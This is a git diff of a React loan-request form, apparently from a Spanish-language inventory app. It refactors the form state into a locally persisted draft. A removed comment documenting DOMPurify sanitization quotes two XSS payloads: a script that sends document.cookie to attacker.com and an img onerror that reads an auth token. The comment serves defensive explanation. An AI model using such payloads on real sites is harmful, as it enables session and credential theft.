@@ -2,6 +2,7 @@ import { useState, useEffect } from 'react'
 import { apiFetch } from '../utils/api'
 import { sanitize, validateLength, FIELD_LIMITS } from '../utils/security'
 import { buildSolicitudPayload } from '../utils/dataMinimization'
+import useLocalDraft from '../hooks/useLocalDraft'
 import PrivacyModal from './PrivacyModal'
 import './inventory.css'
 
@@ -30,16 +31,23 @@ export default function LoanRequestForm() {
     loadAssets()
   }, [])
 
-  const [selected, setSelected] = useState({})
-  const [eventName, setEventName] = useState('')
-  const [date, setDate] = useState('')
-  const [period, setPeriod] = useState('Mañana')
+  // RNF3-F: Persistencia de datos del formulario de solicitud
+  const [draft, setDraft, isRestored, clearDraft] = useLocalDraft('draft_loan_request', {
+    selected: {},
+    eventName: '',
+    date: '',
+    period: 'Mañana',
+  })
+
   const [errors, setErrors] = useState({})
   const [successMsg, setSuccessMsg] = useState('')
   const [showPrivacy, setShowPrivacy] = useState(false)
 
   function toggleSelect(id) {
-    setSelected((s) => ({ ...s, [id]: !s[id] }))
+    setDraft((s) => ({
+      ...s,
+      selected: { ...s.selected, [id]: !s.selected[id] },
+    }))
   }
 
   // ═══════════════════════════════════════════════════════════════════
@@ -61,21 +69,21 @@ export default function LoanRequestForm() {
   // rechazará datos inválidos aunque el frontend sea manipulado.
   function validate() {
     const e = {}
-    if (!eventName.trim()) e.eventName = 'El nombre del evento es obligatorio'
-    if (!date) e.date = 'La fecha es obligatoria'
+    if (!draft.eventName.trim()) e.eventName = 'El nombre del evento es obligatorio'
+    if (!draft.date) e.date = 'La fecha es obligatoria'
 
     // Validación de longitud máxima (bypasseable desde DevTools)
-    const lenError = validateLength(eventName, 'eventName')
+    const lenError = validateLength(draft.eventName, 'eventName')
     if (lenError) e.eventName = lenError
 
     // Detección de contenido XSS antes de enviar
-    if (eventName !== sanitize(eventName)) {
+    if (draft.eventName !== sanitize(draft.eventName)) {
       e.eventName = '⚠️ Se detectó contenido potencialmente peligroso (XSS)'
     }
 
     if (assets.length === 0) {
       e.assets = 'No hay activos disponibles en el inventario'
-    } else if (Object.values(selected).every((v) => !v)) {
+    } else if (Object.values(draft.selected).every((v) => !v)) {
       e.assets = 'Selecciona al menos un activo'
     }
     setErrors(e)
@@ -86,20 +94,13 @@ export default function LoanRequestForm() {
     e.preventDefault()
     if (!validate()) return
 
-    const chosen = assets.filter((a) => selected[a.id])
+    const chosen = assets.filter((a) => draft.selected[a.id])
 
     // ═══════════════════════════════════════════════════════════════
     // PRUEBA XSS — Sanitización de inputs con DOMPurify
     // ═══════════════════════════════════════════════════════════════
-    // Antes de enviar al backend, sanitizamos el nombre del evento.
-    // Ejemplo de payload XSS que sería bloqueado:
-    //   Input:  <script>fetch('https://attacker.com?c='+document.cookie)</script>
-    //   Output: "" (DOMPurify elimina el tag script completamente)
-    //
-    //   Input:  <img src=x onerror="alert(localStorage.getItem('mg_token'))">
-    //   Output: <img src="x"> (DOMPurify elimina el atributo onerror)
-    const safeEventName = sanitize(eventName.trim())
-    const safeComentarios = `Evento: ${safeEventName} - Fecha: ${date} - Periodo: ${period}`
+    const safeEventName = sanitize(draft.eventName.trim())
+    const safeComentarios = `Evento: ${safeEventName} - Fecha: ${draft.date} - Periodo: ${draft.period}`
 
     try {
       await Promise.all(
@@ -116,10 +117,9 @@ export default function LoanRequestForm() {
         })
       )
 
-      setSelected({})
-      setEventName('')
-      setDate('')
-      setPeriod('Mañana')
+      // RNF3-F: Limpiamos el borrador local tras el envío exitoso
+      clearDraft()
+
       setErrors({})
       setSuccessMsg('Solicitud enviada correctamente. Está pendiente de aprobación.')
 
@@ -140,6 +140,23 @@ export default function LoanRequestForm() {
   return (
     <section className="loan-container">
       <h2>Solicitud de préstamo</h2>
+      {isRestored && (
+        <div
+          style={{
+            padding: '0.8rem',
+            backgroundColor: 'rgba(59, 130, 246, 0.1)',
+            color: '#2563eb',
+            borderRadius: '8px',
+            marginBottom: '1rem',
+            border: '1px solid rgba(59, 130, 246, 0.2)',
+            fontSize: '0.9rem',
+          }}
+          role="status"
+        >
+          ℹ️ <strong>Borrador recuperado:</strong> Se restauraron los datos que estabas capturando
+          antes de cerrar la página.
+        </div>
+      )}
       {successMsg && (
         <div
           style={{
@@ -163,13 +180,13 @@ export default function LoanRequestForm() {
               DOMPurify en handleSubmit: segundo filtro.
               Backend: tercer y definitivo filtro. */}
           <input
-            value={eventName}
+            value={draft.eventName}
             maxLength={FIELD_LIMITS.eventName}
-            onChange={(e) => setEventName(e.target.value)}
+            onChange={(e) => setDraft({ ...draft, eventName: e.target.value })}
             placeholder="Ej: Concierto de Fin de Año"
           />
           <small style={{ color: 'var(--text-muted)', fontSize: '0.75rem' }}>
-            {eventName.length}/{FIELD_LIMITS.eventName} caracteres
+            {draft.eventName.length}/{FIELD_LIMITS.eventName} caracteres
           </small>
         </div>
 
@@ -177,8 +194,8 @@ export default function LoanRequestForm() {
           <label>Fecha {errors.date && <span className="error-text">{errors.date}</span>}</label>
           <input
             type="date"
-            value={date}
-            onChange={(e) => setDate(e.target.value)}
+            value={draft.date}
+            onChange={(e) => setDraft({ ...draft, date: e.target.value })}
             onClick={(e) => e.target.showPicker && e.target.showPicker()}
             style={{ cursor: 'pointer' }}
           />
@@ -186,7 +203,10 @@ export default function LoanRequestForm() {
 
         <div className="form-group">
           <label>Periodo</label>
-          <select value={period} onChange={(e) => setPeriod(e.target.value)}>
+          <select
+            value={draft.period}
+            onChange={(e) => setDraft({ ...draft, period: e.target.value })}
+          >
             <option>Mañana</option>
             <option>Tarde</option>
             <option>Noche</option>
@@ -212,7 +232,7 @@ export default function LoanRequestForm() {
                 <label key={a.id} className="asset-card">
                   <input
                     type="checkbox"
-                    checked={!!selected[a.id]}
+                    checked={!!draft.selected[a.id]}
                     onChange={() => toggleSelect(a.id)}
                   />
                   <div>
